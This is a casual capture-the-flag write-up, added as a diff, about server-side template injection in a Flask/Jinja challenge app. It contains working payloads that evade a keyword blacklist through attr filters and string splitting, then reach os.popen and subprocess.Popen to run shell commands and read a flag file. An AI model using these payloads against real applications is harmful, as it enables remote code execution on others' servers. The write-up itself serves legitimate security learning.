@@ -1,0 +1,107 @@
+The Website/Source
+------------------
+generic flask app that takes whatever you send through the form, base64 encodes it, redircts you to another page. the new page will base64 decode your content and run it through flask's render_template.  There is also a blacklist of strings that the content is checked for which will replace the entire content with a message about "stack smashing" (and there is a comment about xss as well.  nothing we're doing here is either xss or stack smashing lmao)
+
+
+
+Basic Server Side Template Injection
+------------------------------------
+obviously letting us run shit through flask's render_template is a problem.  We can verify this by putting in
+
+    {{7//2}}
+
+and see that our page prints "3" (it did the integer division server side)
+
+we can also start looking at variables on the server script and running arbitrary python
+
+    {{dict(config)}}
+
+interestingly, I assumed our flag would either be in config[SECRET_KEY] (common place for flask app auth key) or somewhere in g (flask's global variables), but these were empty.
+
+
+
+Deeper SSTI
+-----------
+so likely we need to go deeper with the arbitrary code execution (server-side-template-injection)
+
+a standard way to do this with python/jinja templates is
+
+    {{"foo".__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen("ls").read()}}
+
+or use an empty string '' or empty list [] rather than that "foo" string
+
+but that blacklist is keeping us from doing this because it checks for "las" (class), "bas" (base), and "bal" (globals).
+
+if anything, I think this is a clue that we're on the right track.  I'm assuming getting around this blacklist shouldn't be too hard
+
+
+
+Avoiding the Blacklist
+----------------------
+okay, so python is pretty shit with data encapsulation (as demonstrated with that module traversal to os.popen) and there is any number of ways to get around avoiding certain keywords, but in this case, it looks like we aren't going to be able to avoid them all
+
+from there, we have a number of ways to access attributes of an object with a string (which means we can obfuscate it). some examples:
+
+    obj.__class__
+    getattr(obj,"__class__")
+    obj["__class__"]
+    and jinja actually has a "filter" syntax
+    obj|attr("__class__")
+
+now getattr isn't available to us (surprisingly, quite a few python builtins are gone.  I was only able to use dict() from what I tested.  I didn't even have access to dir(), which made searching through objects and figuring out what I had access to a huge fucking pain)
+
+the [] syntax is only really useful on objects where it isn't overloaded ("test"["__class__"] won't work because strings expect a numeric index in []. similar issue with the empty list [])
+
+but that jinja filter does work for us!
+
+from here there are quite a few ways we can obfuscate our keywords to evade the filter
+
+we could use string concatenation (obj|attr("__cl"+"ass__"))
+
+python escape characters (obj|attr("__cl\x61ss__"))
+
+and even hiding strings in other request parameters that aren't checked against the blacklist (?exploit={{obj|attr(request.args.param)}}&param=__class__)
+
+now with this I tried the earlier "ls" command, but it failed.  after digging through piece by piece, it gets hung up looking for the 182nd subclass of obj.  In other words, this works
+
+{{ []|attr("__cl"+"ass__")|attr("__b"+"ase__")|attr("__subcl"+"asses__")() }}
+
+which will print out an array of subclasses of obj.  The 182nd is supposed to be warnings.catch_warnings which uses the "sys" module which gives us a pivot point into the "os" module, but it isn't there.
+
+okay, it looks like it IS in there, but for some fucking reason the [] operator isn't working.  so we can use __getitem__, I guess.  But .function() syntax also isn't working now???  so I guess we can use |attr() for everything...
+
+{{ []|attr("__cl"+"ass__")|attr("__b"+"ase__")|attr("__subcl"+"asses__")()|attr("__getitem__")(182)|attr("__init__")|attr("__glob"+"als__")|attr("__getitem__")("sys")|attr("modules")|attr("__getitem__")("os")|attr("popen")("ls")|attr("read")() }}
+
+this is the final version of it that actually manages to run "ls" on the remote machine.  And there is a flag.txt. so we can do the same thing, but with "cat flag.txt"
+
+
+
+Working through some of the problems
+------------------------------------
+okay, I was having problems with the [] and . operators because of the |attr() filter.  it's doing something weird either as a order or operations thing or possibly a preprocessor thing.  Doesn't matter, we can get around it by enclosing the whole "filter expression" in parenthesis
+
+    {{ (([]|attr("__cl"+"ass__")|attr("__b"+"ase__")|attr("__subcl"+"asses__")())[182].__init__|attr("__glob"+"als__"))["sys"].modules["os"].popen("ls").read() }}
+
+looking back at that subclass list, subprocess.Popen was actually in there directly.  So we could just use that rather than going all the way around to get to os. using list slicing to find the offset...
+
+    ([]|attr("__cl"+"ass__")|attr("__b"+"ase__")|attr("__subcl"+"asses__")())[100:]
+    [200:]
+    ...
+
+it's at [360]
+
+and then we can just call it
+
+    {{ ([]|attr("__cl"+"ass__")|attr("__b"+"ase__")|attr("__subcl"+"asses__")())[360]("ls",shell=True,stdout=-1).communicate() }}
+
+shell=True makes it actually launch the shell as the program and give "ls" as a command in the shell (useful if, say, ls was a shell builtin instead of a separate program)
+
+stdout=-1 is setting stdout to subprocess.PIPE which is necessary to get anything out of it
+
+.communicate() gives us a way to either pipe in input or pipe out output.  we're using it to pipe out.  it returns a tuple of (stdout,stderr)
+
+in our case, because only stdout was set to PIPE, we get (<some-data>,None)
+
+The output is in a byte string, so the output gets escaped and we have a bunch of '\n' everywhere, but that is definitely the output of ls and we can go from there.
+
+
